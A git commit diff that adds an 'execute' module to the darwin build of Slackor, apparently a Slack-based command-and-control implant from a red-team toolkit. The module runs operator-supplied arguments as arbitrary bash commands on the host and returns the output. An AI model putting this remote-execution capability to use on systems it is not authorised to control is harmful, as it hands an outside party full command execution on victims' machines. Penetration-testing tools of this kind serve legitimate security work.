68c76aa67ffc541f49f3a35e748c0794eb30e863
Bob Aman <bob@sporkmonger.com>
2019-07-19 01:30:44 +0000

    Add arbitrary execution capability to Mac and Linux

--- pkg/darwin/execute.go
+++ pkg/darwin/execute.go
@@ -1,1 +1,43 @@
+// +build darwin
+
 package darwin
+
+import (
+	"bytes"
+	"fmt"
+	"os/exec"
+	"strings"
+
+	"github.com/Coalfire-Research/Slackor/pkg/command"
+)
+
+var cmdName = "bash"
+
+// Execute runs an arbitrary command
+type Execute struct{}
+
+// Name is the name of the command
+func (e Execute) Name() string {
+	return "execute"
+}
+
+// Run runs an arbitrary command
+func (e Execute) Run(clientID string, jobID string, args []string) (string, error) {
+	cmdArgs := []string{"-c"}
+	cmdArgs = append(cmdArgs, strings.Join(args, " "))
+	cmd := exec.Command(cmdName, cmdArgs...)
+	fmt.Println("Running command: " + strings.Join(args, " "))
+	var out bytes.Buffer
+	var stderr bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &stderr
+	err := cmd.Run()
+	if err != nil {
+		return stderr.String(), err
+	}
+	return out.String(), nil
+}
+
+func init() {
+	command.RegisterCommand(Execute{})
+}
